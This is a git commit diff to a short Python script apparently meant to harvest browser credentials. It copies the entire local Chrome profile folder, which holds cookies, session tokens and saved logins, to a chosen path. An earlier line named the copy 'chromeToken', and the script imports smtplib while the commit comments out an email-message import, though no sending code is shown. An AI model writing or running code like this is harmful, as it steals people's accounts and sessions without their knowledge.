6f848b97d407aef363c008abce9b370231b50f39
CursedRicky <78096957+CursedRicky@users.noreply.github.com>
2024-01-17 16:46:09 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,8 +1,7 @@
 import shutil, os, smtplib
-from email.message import EmailMessage
+#from email.message import EmailMessage
 
 src = os.environ['USERPROFILE'] + r"\AppData\Local\Google\Chrome"
 dst = input("Percorso destinazione: ")
 
-shutil.copytree(src, dst + r"\chromeToken")
-
+shutil.copytree(src, dst + r"\Chrome")
